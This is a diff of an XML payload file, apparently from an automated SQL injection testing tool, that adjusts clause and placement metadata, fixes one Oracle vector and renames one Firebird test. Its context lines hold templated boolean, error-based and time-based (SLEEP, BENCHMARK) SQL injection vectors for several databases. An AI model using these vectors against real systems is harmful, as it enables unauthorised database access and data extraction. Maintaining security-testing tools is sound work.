@@ -508,7 +508,7 @@ Formats:
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>2,3</clause>
+        <clause>1,2,3</clause>
         <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/0 END))</vector>
         <request>
@@ -524,7 +524,7 @@ Formats:
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>2,3</clause>
+        <clause>1,2,3</clause>
         <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</vector>
         <request>
@@ -544,7 +544,7 @@ Formats:
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>2,3</clause>
+        <clause>1,2,3</clause>
         <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
         <request>
@@ -563,7 +563,7 @@ Formats:
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>3</clause>
+        <clause>1,3</clause>
         <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
         <request>
@@ -582,9 +582,9 @@ Formats:
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>3</clause>
+        <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) > %d) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
@@ -798,7 +798,7 @@ Formats:
         <level>2</level>
         <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
             <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
@@ -818,7 +818,7 @@ Formats:
         <level>2</level>
         <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
             <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
@@ -837,7 +837,7 @@ Formats:
         <level>2</level>
         <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]'))</vector>
         <request>
             <payload>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
@@ -856,7 +856,7 @@ Formats:
         <level>2</level>
         <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
@@ -875,7 +875,7 @@ Formats:
         <level>3</level>
         <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
@@ -900,7 +900,7 @@ Formats:
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
-        <clause>2,3</clause>
+        <clause>1,2,3</clause>
         <where>3</where>
         <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
@@ -920,7 +920,7 @@ Formats:
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
-        <clause>2,3</clause>
+        <clause>1,2,3</clause>
         <where>3</where>
         <vector>(CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
@@ -939,7 +939,7 @@ Formats:
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
-        <clause>3</clause>
+        <clause>1,3</clause>
         <where>3</where>
         <vector>(CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</vector>
         <request>
@@ -958,7 +958,7 @@ Formats:
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
-        <clause>3</clause>
+        <clause>1,3</clause>
         <where>3</where>
         <vector>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
@@ -973,11 +973,11 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird error-based - WHERE clause (OR)</title>
+        <title>Firebird error-based - Parameter replace</title>
         <stype>2</stype>
         <level>4</level>
         <risk>0</risk>
-        <clause>3</clause>
+        <clause>1,3</clause>
         <where>3</where>
         <vector>(SELECT [RANDNUM]=('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]'))</vector>
         <request>
@@ -1396,7 +1396,7 @@ Formats:
         <level>2</level>
         <risk>3</risk>
         <clause>1,2,3</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR IF(([INFERENCE]), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
         <request>
             <payload>OR SLEEP([SLEEPTIME])</payload>
@@ -1416,7 +1416,7 @@ Formats:
         <level>3</level>
         <risk>3</risk>
         <clause>1,2,3</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR IF(([INFERENCE]), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</vector>
         <request>
             <payload>OR BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
